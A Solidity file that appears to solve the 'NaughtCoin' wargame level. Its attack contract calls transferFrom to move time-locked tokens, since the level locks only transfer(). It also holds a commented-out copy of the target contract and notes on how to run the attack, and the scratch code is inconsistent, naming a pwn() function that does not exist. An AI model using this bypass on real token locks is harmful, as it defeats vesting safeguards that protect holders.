// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract NaughtCoinHack {
    INaughtCoin coin;
    IERC20 coinerc;

    constructor(address _address) {
        coin = INaughtCoin(_address);
        coinerc = IERC20(_address);
    }

    function call(address from, address to, uint amount) public {
        coinerc.transferFrom(from, to, amount);
    }
}

contract ERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    string public name;
    string public symbol;
    uint8 public decimals = 18;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// contract NaughtCoin is ERC20 {
//     // string public constant name = 'NaughtCoin';
//     // string public constant symbol = '0x0';
//     // uint public constant decimals = 18;
//     uint256 public timeLock = block.timestamp + 10 * 365 days;
//     uint256 public INITIAL_SUPPLY;
//     address public player;

//     constructor(address _player) ERC20("NaughtCoin", "0x0") {
//         player = _player;
//         INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
//         // _totalSupply = INITIAL_SUPPLY;
//         // _balances[player] = INITIAL_SUPPLY;
//         _mint(player, INITIAL_SUPPLY);
//         emit Transfer(address(0), player, INITIAL_SUPPLY);
//     }

//     function transfer(
//         address _to,
//         uint256 _value
//     ) public override lockTokens returns (bool) {
//         super.transfer(_to, _value);
//     }

//     // Prevent the initial owner from transferring tokens until the timelock has passed
//     modifier lockTokens() {
//         if (msg.sender == player) {
//             require(block.timestamp > timeLock);
//             _;
//         } else {
//             _;
//         }
//     }
// }

// deploy my contract
// approve that contract
// then call pwn()

pragma solidity ^0.8.20;

// interface IERC20 {
//     function approve(address spender, uint256 amount) external returns (bool);
//     function transferFrom(address from, address to, uint256 amount) external returns (bool);
//     function balanceOf(address) external view returns (uint256);
// }

// contract NaughtCoinHack {
//     IERC20 coin;

//     constructor(address _address) {
//         coin = IERC20(_address);
//     }

//     function hack(address _player) public {
//         uint256 balance = coin.balanceOf(_player);
//         coin.transferFrom(_player, address(this), balance);
//     }
// }
